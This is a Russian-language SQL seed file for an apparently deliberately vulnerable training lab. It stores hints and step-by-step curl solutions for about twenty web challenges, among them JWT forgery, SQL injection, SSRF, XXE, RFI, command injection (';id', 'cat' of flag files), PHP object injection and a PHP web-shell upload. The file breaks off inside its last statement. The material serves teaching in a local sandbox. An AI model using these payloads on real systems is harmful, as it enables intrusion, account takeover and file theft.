-- Подробные подсказки и разборы: куда идти, чем стучать и что ожидать.
-- Каждое поле 300-600 символов, проверено по исходникам сервисов.
-- Идемпотентно: можно применять и к уже поднятой базе.

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки: небезопасная проверка JWT. Auth-service берёт алгоритм из заголовка токена и для alg=none пропускает проверку подписи. Ищите в services/auth-service функцию decode_token и эндпоинт GET /api/auth/me. Начните: войдите как student на http://localhost:3000/login, возьмите access_token из ответа POST http://localhost:4000/api/auth/login и разберите токен на header, payload, signature. Посмотрите, какому alg сервер доверяет и как использует role.$mv$,
  hint_2 = $mv$Получите токен: POST http://localhost:4000/api/auth/login с JSON {"username":"student","password":"student123"} — в ответе поле access_token. Разберите токен по точкам. В header поменяйте alg на none, подпись оставьте пустой, но завершающая точка нужна. В payload сохраните sub студента (11111111-1111-1111-1111-111111111111) и username student, а role выставьте в admin. Затем GET http://localhost:4000/api/auth/me с заголовком Authorization: Bearer ваш токен. Если подпись не проверяется, в ответе появится поле flag.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}' | jq -r .access_token
H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"sub":"11111111-1111-1111-1111-111111111111","username":"student","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s http://localhost:4000/api/auth/me -H "Authorization: Bearer $H.$P." -> flag MV{JWT_ALG_NONE_2026}$mv$
WHERE slug = 'jwt-alg-none';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — слабый секрет подписи JWT. Сервис auth-service выпускает токены HS256, подписывая их значением переменной JWT_SECRET; по умолчанию это короткое словарное значение из конфигурации шлюза services/api-gateway/src/config.js и файла .env. Секрет можно подобрать офлайн по одному известному токену. Первый шаг: войдите как student/student123 через POST http://localhost:4000/api/auth/login, сохраните access_token и разберите заголовок и payload.$mv$,
  hint_2 = $mv$План. 1) Возьмите токен: curl -s http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}'. 2) Скопируйте access_token в jwt.txt. 3) Подберите секрет офлайн: hashcat -m 16500 jwt.txt rockyou.txt либо jwt_tool <token> -C -d wordlist.txt. 4) В payload найдите sub (id студента) и role. 5) Подпишите новый токен тем же секретом, сохранив sub, iat и exp, заменив role на admin. 6) Отправьте GET http://localhost:4000/api/auth/me с заголовком Authorization: Bearer <токен>: в JSON будет поле flag.$mv$,
  solution_payload = $mv$# Токен: POST http://localhost:4000/api/auth/login (student/student123)
# Секрет: hashcat -m 16500 jwt.txt rockyou.txt -> weak-jwt-secret
H=eyJhbGciOiJIUzI1NiJ9; P=eyJzdWIiOiIxMTExMTExMS0xMTExLTExMTEtMTExMS0xMTExMTExMTExMTEiLCJyb2xlIjoiYWRtaW4ifQ
S=$(printf '%s' "$H.$P" | openssl dgst -sha256 -hmac weak-jwt-secret -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s http://localhost:4000/api/auth/me -H "Authorization: Bearer $H.$P.$S"
# Флаг: MV{JWT_WEAK_SECRET_31e0708c}$mv$
WHERE slug = 'jwt-weak-secret';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — SQL-инъекция в аутентификации. Сервис auth-service, эндпоинт POST /api/auth/login (шлюз http://localhost:4000) или форма входа на http://localhost:3000/login. Уязвим параметр username: он подставляется в SQL конкатенацией, поэтому одинарная кавычка меняет границу строки, а комментарий -- отбрасывает проверку пароля. Первый шаг: откройте DevTools на странице входа, войдите как student/student123 и в Network посмотрите тело JSON с полями username и password и адрес запроса.$mv$,
  hint_2 = $mv$Откройте http://localhost:3000/login или отправьте POST на http://localhost:4000/api/auth/login с заголовком Content-Type: application/json. Тело {"username":"admin","password":"student123"} даёт обычный вход. Теперь измените только username, чтобы условие по паролю перестало учитываться: admin'-- . Одинарная кавычка закрывает строку, а -- комментирует остаток запроса вместе с проверкой пароля, поэтому поле password можно оставить любым. Ожидайте ответ 200: в JSON user.role равен admin, а в поле flag придёт значение вида MV{SQLI_AUTH_BYPASS_...}.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}"
Через UI: http://localhost:3000/login, username admin'--, пароль любой.
Альтернатива: username = ' OR 1=1 LIMIT 1--
Ожидаемый результат: HTTP 200, user.role = admin, JSON-поле flag = MV{SQLI_AUTH_BYPASS_...}$mv$
WHERE slug = 'sqli-auth-bypass';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — массовое присваивание (Mass Assignment): сервер сохраняет в профиль поля, которых нет в интерфейсе. Ищите в auth-service и на странице Профиль — localhost:3000/profile. Форма меняет только email, но обработчик PATCH /api/auth/profile принимает лишние колонки таблицы users. Первый шаг проверки: войдите как student/student123, заберите access_token из POST http://localhost:4000/api/auth/login и обновите профиль обычным email, обратив внимание, какие поля возвращает ответ.$mv$,
  hint_2 = $mv$Получите токен: POST http://localhost:4000/api/auth/login, Content-Type: application/json, тело {"username":"student","password":"student123"}; в ответе возьмите access_token. Затем PATCH http://localhost:4000/api/auth/profile с заголовками Content-Type: application/json и Authorization: Bearer <токен>. Сначала отправьте легальное {"email":"student@academy.local"} — запрос должен обновить профиль. После этого добавьте в тело колонку, которой нет в форме, — role со значением admin. Ожидайте смену user.role на admin и непустое поле flag в ответе.$mv$,
  solution_payload = $mv$# 1. вход student/student123 и токен
TOKEN=$(curl -s -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
# 2. массовое присваивание: добавляем поле role
curl -s -X PATCH http://localhost:4000/api/auth/profile -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"role":"admin"}'
# ответ: {"user":{"role":"admin",...},"flag":"MV{MASS_ASSIGNMENT_ROLE_35ba5e0b}"}$mv$
WHERE slug = 'mass-assignment-role';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Brute Force: отсутствие ограничения попыток входа. Ищите в сервисе auth-service эндпоинт POST /api/auth/login (через шлюз — http://localhost:4000/api/auth/login), параметры username и password в JSON-теле; страница входа на localhost:3000 использует /api/session/login. Счётчик попыток хранится в Redis по ключу auth:attempts:<username>. Первый шаг: отправьте вход с username=admin и неверным паролем и повторите 20-25 раз — каждый раз будет 401 invalid credentials.$mv$,
  hint_2 = $mv$Отправьте POST http://localhost:4000/api/auth/login с заголовком Content-Type: application/json и телом {"username":"admin","password":"<вариант>"}: подойдут curl или ffuf с -d '{"username":"admin","password":"FUZZ"}'. Перебирайте слова из словаря, сервер не считает попытки и не блокирует аккаунт. Сделайте не меньше 20 неудачных попыток подряд (на неудачу приходит 401 invalid credentials), затем войдите верным паролем. В успешном ответе смотрите поля flag и flags — там значение вида MV{BRUTE_FORCE_LOGIN_...}.$mv$,
  solution_payload = $mv$# 20 неудач копят счётчик auth:attempts:admin (TTL 3600 с), затем верный пароль
for i in $(seq 1 20); do curl -s -o /dev/null -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"x"}'; done
curl -s -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}'
# ожидаемый результат: "flag": "MV{BRUTE_FORCE_LOGIN_...}" и "flags": ["MV{...}"]$mv$
WHERE slug = 'brute-force-login';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Open Redirect: параметр next задаёт адрес перенаправления и не проверяется. Ищите в сервисе auth-service, эндпоинт GET /api/auth/login; через шлюз это http://localhost:4000/api/auth/login. Первым шагом отправьте запрос с произвольным next и посмотрите заголовок Location: сервер вернёт 307 и подставит ваше значение как есть. Обратите внимание на форму адреса — абсолютный и протокол-относительный URL ведут себя по-разному.$mv$,
  hint_2 = $mv$План: сделайте GET-запрос на http://localhost:4000/api/auth/login с параметром next, подставив адрес другого сайта. Смотрите ответ целиком: нужны заголовки Location (куда ушло перенаправление) и X-Challenge-Flag. Сначала проверьте протокол-относительный вариант next=//evil.example/phish, затем абсолютный next=http://evil.example. Успех — Location указывает на чужой хост. Для контроля повторите с next=/profile: относительный путь останется на стенде и флага не даст.$mv$,
  solution_payload = $mv$curl -i "http://localhost:4000/api/auth/login?next=//evil.example/phish"
curl -i "http://localhost:4000/api/auth/login?next=http://evil.example"
# Ожидаемый результат: 307 Temporary Redirect, location: //evil.example/phish
# и заголовок x-challenge-flag: MV{OPEN_REDIRECT_LOGIN_b7e0c8b1}
# Для контроля next=/profile даёт 307 на localhost без флага.$mv$
WHERE slug = 'open-redirect-login';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки: Password Reset Poisoning — сервер собирает ссылку сброса из заголовка Host и доверяет ему. Ищите в auth-service: POST /api/auth/forgot-password читает request.headers['host'] и вставляет его в ссылку письма. Шлюз localhost:4000 передаёт Host без изменений. Первый шаг: отправьте POST http://localhost:4000/api/auth/forgot-password с телом {"email":"student@academy.local"} и заголовком Host: test.local, затем проверьте поле link в GET /api/auth/mailbox?email=student@academy.local.$mv$,
  hint_2 = $mv$План: 1) Отправьте POST http://localhost:4000/api/auth/forgot-password с JSON {"email":"admin@academy.local"} и заголовком Host: evil.example; в ответе будет {"status":"sent"}. 2) Заберите письмо: GET http://localhost:4000/api/auth/mailbox?email=admin@academy.local — в messages[0].link увидите http://evil.example/api/auth/reset?token=... 3) Скопируйте token из ссылки и вызовите POST /api/auth/reset с JSON {"token":"<token>","new_password":"rotated123"}. 4) Сервис вернёт status=password_changed; флаг будет в поле flag.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/api/auth/forgot-password -H 'Content-Type: application/json' -H 'Host: evil.example' -d '{"email":"admin@academy.local"}'
TOKEN=$(curl -s 'http://localhost:4000/api/auth/mailbox?email=admin@academy.local' | python3 -c "import sys,json;print(json.load(sys.stdin)['messages'][0]['link'].split('token=')[1])")
curl -s -X POST http://localhost:4000/api/auth/reset -H 'Content-Type: application/json' -d '{"token":"'$TOKEN'","new_password":"rotated123"}'
# Ответ: {"status":"password_changed","flag":"MV{PASSWORD_RESET_POISONING_5a04169e}"}$mv$
WHERE slug = 'password-reset-poisoning';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки: избыточное раскрытие схемы GraphQL (introspection) на шлюзе api-gateway. Схема задана в services/api-gateway/src/graphql.js и принимается методом POST http://localhost:4000/graphql; интроспекция не отключена, а служебные поля не закрыты проверкой прав. Первый шаг: отправьте запрос интроспекции и посмотрите поля типа Query — среди привычных products, product, me должно найтись служебное поле, которого нет в интерфейсе магазина, и тип Diagnostics с полем flag.$mv$,
  hint_2 = $mv$План: 1) Отправьте POST http://localhost:4000/graphql с заголовком Content-Type: application/json и телом {"query":"{ __schema { queryType { fields { name } } } }"}. 2) В ответе data.__schema.queryType.fields перечислены все запросы; найдите systemDiagnostics (возвращает тип Diagnostics: service, uptime, flag). 3) Вызовите его тем же способом: {"query":"{ systemDiagnostics { service uptime flag } }"}. Ожидайте блок data.systemDiagnostics с заполненным flag. Cookie, токен и вход в аккаунт не нужны — эндпоинт публичный.$mv$,
  solution_payload = $mv$# 1. Интроспекция: находим скрытый запрос
curl -s -X POST http://localhost:4000/graphql -H 'Content-Type: application/json' -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
# 2. Вызываем systemDiagnostics и забираем флаг
curl -s -X POST http://localhost:4000/graphql -H 'Content-Type: application/json' -d '{"query":"{ systemDiagnostics { flag } }"}'
# Ответ: {"data":{"systemDiagnostics":{"flag":"MV{GRAPHQL_INTROSPECTION_4b53e7d4}"}}}$mv$
WHERE slug = 'graphql-introspection';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки: отказ в обслуживании через пакетную обработку GraphQL. Шлюз api-gateway принимает POST /graphql, где тело — не один объект, а массив операций, и не ограничивает длину массива. Ищите на странице http://localhost:3000/challenge/graphql-batching-dos, сервис api-gateway. Первый шаг: отправьте POST http://localhost:4000/graphql с телом-массивом из пары объектов {"query":"{ __typename }"} и проверьте, что ответ содержит поля batch, elapsedMs и results. Токен не нужен.$mv$,
  hint_2 = $mv$План: соберите JSON-массив из 200 и более одинаковых объектов вида {"query":"{ __typename }"} (удобно скриптом в файл). Отправьте его одним POST http://localhost:4000/graphql с заголовком Content-Type: application/json. Длину массива, это и есть управляемый параметр, поднимите до 500-2000. В ответе смотрите batch: true, elapsedMs и ветку results; признак срабатывания — непустой extensions у первого элемента results. Учтите: first у products ограничен 200, а флаг зависит только от размера пакета.$mv$,
  solution_payload = $mv$# 200 операций в одном HTTP-запросе — это и запускает счётчик пакета
python3 -c 'import json;print(json.dumps([{"query":"{ __typename }"}]*200))' > b.json
curl -s http://localhost:4000/graphql -H "Content-Type: application/json" --data @b.json
# Ожидаемый результат: флаг MV{GRAPHQL_BATCHING_DOS_d6a7dede}
# в results[0].extensions.flag, рядом batchSize: 200.$mv$
WHERE slug = 'graphql-batching-dos';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Prototype Pollution: рекурсивное слияние пользовательского JSON в шлюзе api-gateway (localhost:4000) позволяет записать свойства в Object.prototype. Точка входа — публичный эндпоинт POST /api/profile/merge: он принимает произвольный JSON и объединяет его через lodash.merge 4.17.4 в общий объект preferences. Первый шаг: отправьте туда без cookie простой JSON вроде {"theme":"dark"} и убедитесь, что ответ содержит ключи profile и preferences. Служебные ключи не фильтруются.$mv$,
  hint_2 = $mv$План. 1) Отправьте анонимный запрос: curl -s -X POST http://localhost:4000/api/profile/merge -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'. 2) Сервер вернёт JSON с ключами profile и preferences, cookie не нужны. 3) Проверьте, что свойство ушло именно в прототип: GET http://localhost:4000/api/admin/summary. 4) Если поле flag осталось null, попробуйте обходной ключ constructor: -d '{"constructor":{"prototype":{"isAdmin":true}}}'. Успех — непустой flag в сводке.$mv$,
  solution_payload = $mv$# загрязняем прототип через шлюз
curl -s -X POST http://localhost:4000/api/profile/merge -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
# забираем флаг из административной сводки
curl -s http://localhost:4000/api/admin/summary
# ожидаемый ответ: {"users":N,"orders":M,"flag":"MV{PROTOTYPE_POLLUTION_<hex>}"}
# актуальное значение лежит в runtime/flags.json$mv$
WHERE slug = 'prototype-pollution';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — SSRF: сервер сам выполняет запрос по URL, который вы передали, и не ограничивает, куда именно обращаться. Ищите в api-gateway: services/api-gateway/src/routes/images.js, маршрут POST /api/images/parse, поле imageUrl в JSON-теле. Первый шаг — войти как student/student123, открыть http://localhost:3000/challenge/ssrf-image-fetch и отправить на эндпоинт любой URL: если в ответе есть status, contentType и preview, запрос выполнил сервер, а не браузер.$mv$,
  hint_2 = $mv$Аутентификация не нужна. Сделайте POST на http://localhost:4000/api/images/parse (или через прокси фронтенда http://localhost:3000/api/images/parse), заголовок Content-Type: application/json, тело {"imageUrl":"http://stats-service:8000/metrics"}. В ответе смотрите поля status, size, preview и flag. Внутренний stats-service слушает порт 8000 и доступен только по DNS-имени из docker-сети. Затем переберите служебные пути сервиса (/health, /metrics, /debug) и найдите тот, что вернёт поле flag.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/api/images/parse -H 'Content-Type: application/json' -d '{"imageUrl":"http://stats-service:8000/debug"}'
# Работает и через прокси фронтенда: http://localhost:3000/api/images/parse
# Берите поле flag верхнего уровня, а не flag из preview сервиса
# Ожидаемый флаг: MV{SSRF_IMAGE_FETCH_6027dfd2}$mv$
WHERE slug = 'ssrf-image-fetch';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — неверная настройка CORS. Шлюз на localhost:4000 отражает в ответе любой присланный Origin и одновременно разрешает передачу cookies (Access-Control-Allow-Credentials: true). Ищите это в services/api-gateway/src/server.js: app.use(cors({ origin: true, credentials: true })). Первый шаг: отправьте GET http://localhost:4000/api/admin/flag с заголовком Origin: https://evil.example и посмотрите, какой Access-Control-Allow-Origin вернёт сервер.$mv$,
  hint_2 = $mv$Войдите как student и получите сессионную cookie connect.sid: POST http://localhost:4000/api/session/login с заголовком Content-Type: application/json и телом {"username":"student","password":"student123"} — сохраните cookie. Затем GET http://localhost:4000/api/admin/flag с этой cookie и заголовком Origin: https://evil.example. В ответе будут поля flag, secret и user. Проверьте, что Access-Control-Allow-Origin повторяет ваш Origin, а Access-Control-Allow-Credentials равно true.$mv$,
  solution_payload = $mv$curl -i -c cookies.txt -X POST http://localhost:4000/api/session/login -H "Content-Type: application/json" -d '{"username":"student","password":"student123"}'
curl -i -b cookies.txt http://localhost:4000/api/admin/flag -H "Origin: https://evil.example"
# Ответ: Access-Control-Allow-Origin: https://evil.example,
# Access-Control-Allow-Credentials: true, флаг в поле flag (MV{CORS_WILDCARD_CREDENTIALS_fccbe5f8}).$mv$
WHERE slug = 'cors-wildcard-credentials';

UPDATE academy.challenges SET
  hint_1 = $mv$IDOR — доступ к чужому объекту по его id. В GraphQL-схеме шлюза есть запрос order(id): он ищет заказ в inventory.orders по номеру и отдаёт данные, не сверяя user_id заказа с вашим аккаунтом. Ищите в сервисе api-gateway, эндпоинт POST http://localhost:4000/graphql. Первый шаг: получите Bearer-токен student через POST /api/auth/login (student/student123) и вызовите order(id: 2) — это ваш заказ. Затем подставьте чужой id и сравните ответ.$mv$,
  hint_2 = $mv$План: 1) Войдите как student: POST http://localhost:4000/api/auth/login, JSON {"username":"student","password":"student123"}, сохраните access_token. 2) Отправьте POST http://localhost:4000/graphql с заголовком Authorization: Bearer <токен> и телом {"query":"{ order(id: 1) { id buyerId notes address } }"}. 3) Заказ id 1 принадлежит admin, а student — другой пользователь, поэтому buyerId в ответе не совпадёт с вашим. 4) Добавьте в выборку поле flag и повторите запрос: сервер сам вернёт флаг, если заказ чужой.$mv$,
  solution_payload = $mv$TOKEN=$(curl -s http://localhost:4000/api/auth/login -H "Content-Type: application/json" -d '{"username":"student","password":"student123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
# заказ id 1 принадлежит admin, но student читает его без проверки владельца
curl -s http://localhost:4000/graphql -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"query":"{ order(id: 1) { id buyerId notes flag } }"}'
# ответ: data.order.flag = MV{GRAPHQL_IDOR_c451596e}$mv$
WHERE slug = 'graphql-idor';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — LFI: включение локального файла через непроверенный путь. Ищите в legacy-service, файл services/legacy-service/html/report.php: параметр page из GET попадает в include без нормализации и белого списка. Отчёт доступен как http://localhost:4000/legacy/report.php. Первый шаг: откройте page=summary.php, убедитесь, что ответ идёт как text/plain, и посмотрите, как __DIR__ и /pages/ склеиваются с вашим вводом.$mv$,
  hint_2 = $mv$План. 1) GET http://localhost:4000/legacy/report.php?page=summary.php — базовый ответ «Сводка отчётов», Content-Type text/plain. 2) Значение page дописывается к __DIR__/pages/, значит нужен обход каталога. Проверьте page=../summary.php: путь нормализуется, и та же страница откроется снова — проверки нет. 3) Увеличивайте число ../, чтобы выйти из webroot /var/www/html в каталог /var/www/flags, и подставьте имя файла-флага lfi.txt. В теле ответа ожидайте строку MV{...}.$mv$,
  solution_payload = $mv$curl 'http://localhost:4000/legacy/report.php?page=../../flags/lfi.txt'
# Ожидаемый ответ: MV{LEGACY_LFI_c74521e3}
# Тот же запрос через фронтенд-прокси:
curl 'http://localhost:3000/legacy/report.php?page=../../flags/lfi.txt'
# Для сверки: page=summary.php возвращает «Сводка отчётов».
# Файл смонтирован в /var/www/flags/lfi.txt, include идёт из /var/www/html/pages/.$mv$
WHERE slug = 'legacy-lfi';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — RFI (remote file inclusion): параметр запроса попадает в include без белого списка. Уязвимость в legacy-service, файл services/legacy-service/html/template.php: он берёт $_GET['page'] и подключает значение напрямую, а в php.ini включены allow_url_fopen и allow_url_include. Первый шаг: откройте http://localhost:4000/legacy/template.php?page=templates/default.php и убедитесь, что параметр page управляет подключаемым файлом.$mv$,
  hint_2 = $mv$Дальше проверьте сам include по URL. Адрес через шлюз: http://localhost:4000/legacy/template.php. Отправьте GET с параметром page=data://text/plain,<?php echo 7*7;?> — в ответе должно появиться 49, это подтверждает исполнение PHP-кода из обёртки. Затем замените echo на чтение /var/www/flags/rfi.txt (каталог смонтирован только на чтение). Значение page кодируйте целиком, например через curl -G --data-urlencode, иначе пробелы и кавычки исказят запрос.$mv$,
  solution_payload = $mv$curl -G 'http://localhost:4000/legacy/template.php' --data-urlencode "page=data://text/plain,<?php echo 7*7;?>"
# проверка: в ответе 49, значит PHP-код из data:// исполняется
curl -G 'http://localhost:4000/legacy/template.php' --data-urlencode "page=data://text/plain,<?php system('cat /var/www/flags/rfi.txt');?>"
# ожидаемый ответ: MV{LEGACY_RFI_...}$mv$
WHERE slug = 'legacy-rfi';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — XXE: PHP-парсер XML в legacy-service включает загрузку внешних сущностей и подставляет содержимое локального файла прямо в ответ. Точка входа — POST /legacy/import.php, опубликованный через шлюз на localhost:4000; тело разбирается как XML, ответ отдаётся как text/plain. Первый шаг: откройте http://localhost:4000/legacy/, найдите ссылку «Импорт XML» и отправьте простой XML с элементом note без сущностей.$mv$,
  hint_2 = $mv$Отправьте POST на http://localhost:4000/legacy/import.php с заголовком Content-Type: application/xml. Сначала проверьте механизм на безобидном файле: <?xml version="1.0"?><!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><invoice><note>&xxe;</note></invoice>. Если вместо текста note видно содержимое файла, замените путь на файл в каталоге /var/www/flags (переменная FLAG_DIR) и повторите запрос. Ответ приходит как text/plain, поэтому содержимое видно сразу.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/legacy/import.php -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///var/www/flags/xxe.txt">]><invoice><note>&xxe;</note></invoice>'
# контроль механизма: тот же запрос с file:///etc/hostname вернёт имя контейнера
# ожидаемый ответ: MV{LEGACY_XXE_6d676a4e}$mv$
WHERE slug = 'legacy-xxe';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Command Injection. Страница legacy-service подставляет параметр host в системную команду ping без экранирования, поэтому ввод становится частью shell-команды, а не адресом хоста. Ищите GET /legacy/ping.php (параметр host) на localhost:3000 или localhost:4000. Первый шаг: откройте http://localhost:3000/legacy/ping.php?host=127.0.0.1 — в text/plain должен быть вывод ping. Затем добавьте к host разделитель ; и команду id.$mv$,
  hint_2 = $mv$План проверки. Отправьте curl 'http://localhost:4000/legacy/ping.php?host=127.0.0.1;id' — параметр host содержит разделитель ;, после которого shell выполнит id. Ожидайте в текстовом ответе строку uid=www-data вместе с выводом ping: значит вторая команда исполняется. Дальше замените id на разведку каталога флагов: host=127.0.0.1;ls%20-la%20/var/www/flags (пробелы кодируйте как %20) и найдите файл cmd.txt. Для чтения используйте cat с тем же приёмом.$mv$,
  solution_payload = $mv$# шаг 1: проверка инъекции, в ответе появится uid=www-data рядом с ping
curl 'http://localhost:4000/legacy/ping.php?host=127.0.0.1;id'

# шаг 2: чтение флага
curl 'http://localhost:4000/legacy/ping.php?host=127.0.0.1;cat%20/var/www/flags/cmd.txt'
# ожидаемый результат: MV{LEGACY_COMMAND_INJECTION_<8 hex>}$mv$
WHERE slug = 'legacy-command-injection';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — небезопасная десериализация PHP (PHP Object Injection). Страница /legacy/dashboard.php в legacy-service принимает cookie prefs и передаёт её значение в unserialize() без проверки типа. Там же объявлен класс CacheFile со свойством path и методом __destruct(), который читает файл. Первый шаг: откройте http://localhost:3000/legacy/dashboard.php без cookie — в ответе будет settings loaded.$mv$,
  hint_2 = $mv$Соберите cookie вручную в DevTools: Application, Cookies, имя prefs. Значение — сериализация объекта CacheFile с одним свойством path: O:9:"CacheFile":1:{s:4:"path";s:N:"...";}, где N строго равно длине строки пути, иначе вернётся Notice unserialize(): Error at offset. Значение cookie обязательно URL-encode, иначе символы ; и { оборвут cookie. Путь берите из /var/www/flags/. Затем GET http://localhost:4000/legacy/dashboard.php.$mv$,
  solution_payload = $mv$# prefs = объект CacheFile, чей __destruct читает файл и печатает его
curl -s --cookie 'prefs=O%3A9%3A%22CacheFile%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A30%3A%22%2Fvar%2Fwww%2Fflags%2Funserialize.txt%22%3B%7D' http://localhost:4000/legacy/dashboard.php
# тот же запрос работает через фронтенд: http://localhost:3000/legacy/dashboard.php
# ответ: settings loaded, затем MV{LEGACY_PHP_OBJECT_INJECTION_262bde83}$mv$
WHERE slug = 'legacy-php-object-injection';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — неограниченная загрузка файлов (Unrestricted File Upload). Страница задания: localhost:3000/challenge/legacy-upload-php. Обработчик живёт в legacy-service и доступен через шлюз: POST http://localhost:4000/legacy/upload.php, файл идёт в multipart-поле file. Первый шаг: загрузите безобидный текстовый файл и разберите JSON-ответ — в поле gateway будет прямая ссылка /legacy/uploads/<имя>.$mv$,
  hint_2 = $mv$Сначала загрузите пробный файл: curl -i -F 'file=@probe.txt' http://localhost:4000/legacy/upload.php. В JSON появятся uploaded: true, name и gateway. Откройте GET http://localhost:4000/legacy/uploads/probe.txt: если вернулся исходный текст, каталог доступен напрямую. Теперь загрузите файл с именем shell.php, внутри которого PHP-код читает файл из каталога флагов (переменная FLAG_DIR). В upload.php нет проверки ни расширения, ни MIME.$mv$,
  solution_payload = $mv$# 1) создайте веб-оболочку, читающую файл флага
printf '%s' '<?php echo file_get_contents("/var/www/flags/upload.txt"); ?>' > shell.php
# 2) загрузите её через шлюз: multipart, поле file
curl -s -F 'file=@shell.php' http://localhost:4000/legacy/upload.php
# 3) выполните загруженный файл и заберите флаг
curl -s http://localhost:4000/legacy/uploads/shell.php
# ожидаемый ответ: флаг вида MV{...}$mv$
WHERE slug = 'legacy-upload-php';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — IDOR: inventory-service отдаёт заказ по числу в пути, проверяя только наличие Bearer-токена, но не владельца. Шлюз публикует маршрут как GET http://localhost:4000/api/inventory/orders/{id}. Первый шаг: войдите как student/student123, получите access_token через POST /api/auth/login и запросите свой заказ id=2 с заголовком Authorization: Bearer <token>. В ответе buyerId 11111111-1111-1111-1111-111111111111 и поля flag нет.$mv$,
  hint_2 = $mv$План: получите токен student через POST http://localhost:4000/api/auth/login с телом {"username":"student","password":"student123"} и скопируйте access_token. Затем выполните GET http://localhost:4000/api/inventory/orders/2 с заголовком Authorization: Bearer <token> — это ваш заказ, запомните buyerId. Дальше меняйте в пути только номер: сначала 1, затем 3. Если buyerId отличается от вашего, сервис добавляет поле flag. В notes заказа 1 лежит приманка MV{GRAPHQL_IDOR_ORDER}.$mv$,
  solution_payload = $mv$TOKEN=$(curl -s -X POST http://localhost:4000/api/auth/login -H "Content-Type: application/json" -d '{"username":"student","password":"student123"}' | jq -r .access_token)
curl -s http://localhost:4000/api/inventory/orders/1 -H "Authorization: Bearer $TOKEN" | jq -r .flag
# ответ: MV{INVENTORY_IDOR_720ce6b7}$mv$
WHERE slug = 'inventory-idor';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — race condition (TOCTOU): в inventory-service проверка баланса и списание разнесены, между ними строку никто не блокирует. Ищите кошелёк на странице http://localhost:3000/profile и эндпоинт POST /api/inventory/redeem, который принимает JSON с полем amount. Первый шаг: войдите как student/student123, получите токен через POST http://localhost:4000/api/auth/login и посмотрите баланс через GET /api/inventory/wallet.$mv$,
  hint_2 = $mv$Получите токен: POST http://localhost:4000/api/auth/login с JSON {"username":"student","password":"student123"}, возьмите access_token. Проверьте баланс: GET http://localhost:4000/api/inventory/wallet. Ключевая деталь: сервис читает баланс, ждёт около 60 мс и лишь затем списывает, поэтому одиночный запрос бесполезен. Отправьте один и тот же POST /api/inventory/redeem с телом {"amount":1000} много раз параллельно, например 30 копий одновременно.$mv$,
  solution_payload = $mv$export TOKEN=$(curl -s -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
seq 30 | xargs -P30 -I{} curl -s -X POST http://localhost:4000/api/inventory/redeem -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"amount":1000}'
# Ожидаемый результат: баланс уходит в минус, в ответе поле flag
# вида MV{INVENTORY_RACE_CONDITION_cadb77f0}$mv$
WHERE slug = 'inventory-race-condition';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Path Traversal: выход из каталога через ../. Сервис inventory-service. Эндпоинт GET /api/inventory/files принимает параметр name, не требует токена и доступен через шлюз. Сервис склеивает каталог /srv/inventory/files со значением name через filepath.Join и не проверяет, что итоговый путь остался внутри. Первый шаг: запросите http://localhost:4000/api/inventory/files?name=readme.txt.$mv$,
  hint_2 = $mv$Запросите GET http://localhost:4000/api/inventory/files?name=../../../etc/hostname. Если вернётся имя контейнера, а не ошибка file not found, значит границы каталога не проверяются. Дальше увеличивайте число сегментов ../ и ведите путь в каталог флагов /var/www/flags, который смонтирован в inventory-service только для чтения; там лежит inventory.txt. Ожидайте ответ text/plain с флагом.$mv$,
